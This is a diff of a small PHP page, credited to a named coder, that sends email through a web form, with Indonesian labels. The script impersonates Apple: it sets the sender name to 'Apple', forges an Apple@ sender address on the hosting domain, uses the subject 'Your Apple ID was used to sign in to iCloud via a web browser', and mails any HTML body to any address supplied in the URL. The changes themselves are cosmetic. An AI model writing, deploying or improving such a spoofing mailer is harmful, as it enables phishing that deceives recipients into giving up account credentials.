@@ -11,10 +11,10 @@
  </head>
 <body> 
 <div class="mainContent">
-    <h2>PHP MAILER/ <small><a href="https://facebook.com/like.a.code">Social Media Coder</a></small></h2>
+    <h2>PHP MAILER/ <small><a href="https://facebook.com/like.a.code">Find Me</a></small></h2>
 <form action="#" method="get">
  <input type="text" name="email" placeholder="masukan email"></input><br/>
-<p><textarea name="pesan" placeholder="Pesan anda" rows="7" cols="50" required>Dimasukan dengan format html</textarea>
+<p><textarea name="pesan" placeholder="Pesan anda" rows="7" cols="50" required>Letter Dimasukan dengan format html</textarea>
  <input type="submit" name="submit" value="Submit"></input>
 </form>
 </body>
@@ -25,7 +25,7 @@
 //--------------------------
 //©Coder IrvanPramana @2019
 //--------------------------
-$name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; 
+$name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; //bisa di custom domain
 $subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
 $body = $_GET ['pesan'];
 $email = "Apple@$web"; 
@@ -38,6 +38,4 @@ $subject,
 $body,
 $headers,$name))
  {  echo("<font color=green>This Email Sended To => $to </font>"); 
-} else 
-{ 
-echo("<font color=red>This Server Not Support For Mailer</font>"); } ?>
+}
